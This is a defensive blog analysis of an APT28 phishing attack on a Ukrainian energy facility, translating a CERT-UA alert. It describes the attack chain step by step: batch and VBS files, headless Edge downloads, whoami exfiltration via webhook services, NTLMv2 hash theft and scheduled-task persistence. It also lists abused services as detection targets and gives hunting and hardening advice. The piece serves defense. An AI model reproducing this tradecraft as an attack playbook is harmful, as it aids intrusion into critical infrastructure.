APT28 Cyberattack: msedge as a bootloader, what can we learn from
the attack to prevent further incidents

Simone Kraus

--

Fancy Bear with several aliases like APT28, Pawn Storm, Sofacy, Group, Sednit, TsarTeam
or Strontium is known for many attacks on governments and critical infrastracture all over the
world including the attack on the German Bundestag in 2014, The White House one year
later and several other attacks on NATO facilities and huge institution like the World Anti-
Doping Agency (WADA). Since the leak of the Vulkan files we should take such attacks very
serious and be prepared also in Europe for the worst case. In the following article I will
translate the latest CERT-UA#7469 Ukraine CERT alert and make some assumptions at the
end.

General Information

1/7



The following summary is a translation and analysis of the latest CERT-UA#7469 regarding
an attack on a critical energy infrastructure facility in Ukraine. Similar attacks are known with
the vulnerability like the CERT-UA#6562; but technically not the same.

The Government Computer Emergency Response Team of Ukraine (CERT-UA) has detected
a targeted cyber attack against a critical energy infrastructure facility in Ukraine. To carry out
the malicious plan, an e-mail message with a fake sender address and a link to the archive,
such as "photo.zip", was distributed.

Visiting the link will download a ZIP archive containing three JPG images and a BAT file
"weblinks.cmd" to the victim's computer. When a CMD file is run, several malicious (also
translated with decoy/fake) web pages will be opened, .bat and .vbs files will be created,
and a VBS file will be launched, which in turn will execute the BAT file.

This will lead to access to the URL using the Microsoft Edge program in "headless" mode,
as a result of which a file with the ".css" extension will be created on the computer in the
"%USERPROFILE%\Downloads" directory, which will subsequently be moved to the
"%PROGRAMDATA%" directory with the ".cmd" extension, executed and deleted.

During the study, a CMD file was downloaded to the computer, designed to execute the
command "whoami" and transmit the result using an HTTP GET request made using the
Microsoft Edge program in "headless" mode.

download with taskkill and whoami.

Picture from the Zscaler Analysis
In the process of controlled emulation of the breach, it was additionally found out that the
victim's computer will file.io download from the file service and "hidden" services designed to
redirect information flows through the TOR network to the appropriate hosts of the local area
network, in particular, the domain controller (ports: 445, 389, 3389) and the mail server
(ports: 443, 445, 3389). In addition, a PowerShell script is used to retrieve the password
hash of the account, which opens the socket and initiates an SMB connection to it using the
"net use" command.

At the same time, remote execution of commands is implemented using "curl" through the
API of the legitimate webhook.site service; Persistence is ensured by creating scheduled
tasks to run a VBS script with a BAT file as an argument.

By restricting the ability to access the web resources of the Mockbin service (mockbin.org,
mocky.io) and blocking the launch of Windows script host (in particular, "wscript.exe") on the
computer, the responsible employee of the mentioned critical energy infrastructure facility

managed to prevent a cyberattack. Note that in the context of detection and counteraction, it
is also advisable to pay attention to the launch of "curl" and "msedge" with the parameter
"--headless=new".

Like the employee of the facility prevented the execution of the script, such restriction can be
done by application white listing what is very often suggested in Zero Trust environments
with a tool like Trellix Solidcore which I personally tested with Atomic Red Team in an OT
environment. You can define which scripts are allowed to be executed via wscript.exe or
cscript.exe for VBA or Java scripts for e.g. Such solution could prevent a successful
exfiltration or impact.

Suspicious headless execution with curl or msedge could be detected with a hunting query
or VIP detection. Make sure, when you see such IOCs to be fast.

Sigma Example for the suspicious execution of the Browser
The Ukrainian CERT says that it’s obvious that in order to circumvent the means of
protection, attackers continue to use the functionality of standard programs (the so-called
LOLBAS - Living Off The Land Binaries, Scripts and Libraries), and to create a control
channel, they abuse the relevant services.

The described activity is carried out by the APT28 group like Fancy Bear. At the same time,
one of the first cases of using the Mockbin service was recorded in April 2023.

The best way for now is to block all known IOCs and to start to hunt. It is not clear if the
threat actor had the goal to exfiltrate data or try disruptive attempts on the critical
infrastructure. Fancy Bear is known for DDoS, phishing attack and malicious code execution.
Fancy Bear was also very often successful with cross-site scripting, password spraying to
access multiple accounts. Zero-day exploits are also known for the Russian APT. They used
to exfiltrate data, but they are not known for wiping or destroying PLCs like Sandworm with
the Industroyer2.

In the latest phishing campaign we also see the social engineering aspect. The Email
included three image with the following message “Hi! I talked to three girls, and they agreed.
Their photos are in the archive; I suggest checking them out on the website.” (Recorded
Future).

I guess, they hoped that the victim will fall into the Julia trap :-).

Let us summarize with a few TTPs:
To understand most of the Fancy Bear operations you can compare their latest campaign
with older campaigns. Spearphishing Link in combination with drive-by compromise websites
by visiting the malicious website seems to be the initial access also used in the past with

which they successfully attacked WADA or the German and French elections in 2016–2017
confirms and latest campaings like described from Zscaler.

Command and Scripting with running scripts like VBS and BAT wit the MITRE ATT@CK
technique T1059.001 PowerShell and more usual for Fancy Bear Windows Command Shell
T1059.003 are a good choke point to prevent the APT moving laterally and this is a great
starting point for application white listing. Defining which scripts are allowed to be
executed, could prevent the lateral movement.

Fancy Bear latest CERT-UA#7469 and Steal-It campaign Zscaler and some older Tools seen
in the wild
Additionally the command line powershell.exe Test-NetConnection -ComputerName
%IP% -Port 389 could be useful to detect suspicious behavior and lateral movement for
LDAP.

Microsoft Defender Hunting KQL
Same with suspicious SMB or RDP connection to domain controller or email server. Here
you can hunt and write specific detection in combination with the C2 TOR attempt for TTPs
like T1071.001 Application layer Protocol including curl or specific the proxy port connection
T1090 that we can see with the NTLMv2 hash stealing within the script. Also the GET
request could be detected, specifically with the download of file from the mockbin service.
APT28 use different ways for exfiltration, but more often asymmetric cryptography T1573.002
or web protocols like mentioned above and proxy that Fancy Bear used with the tool
XTunnel, if you compare it with the capabilities of some of their tools they used in the past.

Another technique they seem to use regularly is the indicator removal and file deletion
T1070.004. And if you want to detect even the anti forensic you can take for example
following query:

Anti Forensics Prefetch Deletion Detection by Cedric Maurugeon
Persistence is ensured by creating scheduled tasks to run a VBS script with a BAT file as an
argument. The technique is T1053.005 and we see it over and over again how important it is
to regularly check your scheduled task with tools like Sysinternals autoruns. It is a very
common technique like T1033 for whoami executed in the CMD file what is also one of the
most used technique that you can see for Russian threat actors not only for APT but also for
ransomware groups and is part of their execution for the file creation and deletion. The
registry startup folder can be seen in the technical analysis of the Steal-It campaign to gain
persistence. I don’t see in the latest alert such an startup folder, but could be a choke point.

A brilliant deep dive technical analysis of other and former campaigns which are similar to
the latest Fancy Bear alert you can find here. The Zscaler Threatlabz research team
additionally mentions the NTLMv2 hash stealing infection chain and compares it with the
CERT-UA#6562. The analyzed Steal-It campaign which was discovered by Zscaler focus on
targeting regions including Australia, Poland and Belgium. A very interesting analysis
within this report is the NTLMv2 hash stealing infection chain. Also the latest CERT-UA#7469
analysis has a script snippet which shows the proxy port 8080 and NTLM type 2 response
with a conversion to base64 creating a new listener set for port 8080 within.

Conclusion:
There are some choke points you can configure or set to stop Fancy Bear. Use application
white listing for your scripts and the tools you don’t need but you know that attackers are
generally using. Make sure that unusual Microsoft Edge processes will be prevented or
detected as VIP alerts. Check regularly your systems if there are anti forensics deletion
going on, same with deleted event logs. Check your proxy configuration if there are any
suspicious connections also to TOR and SOCKS proxy tools. The same for your DNS, SMB
and RDP. Don’t use the standard port 3389 and check regularly with tools like autoruns if
there are any suspicious scheduled tasks. Best protection is prevention and mitigation.
Harden your system with the help of Mandiants documentation you can find here.

Block all IOCs and hunt after suspicious behavior within your Mockbin service. Restrict the
access to the Mockbin services. Files like file.io, webhook.site, mockgin.org and mocky.io
etc. can be legitimate. The recommendation would be to whitelist the legitimate files and
services to avoid FPs. For further support contact also Orange Cyberdefense, especially our
CSIRT.
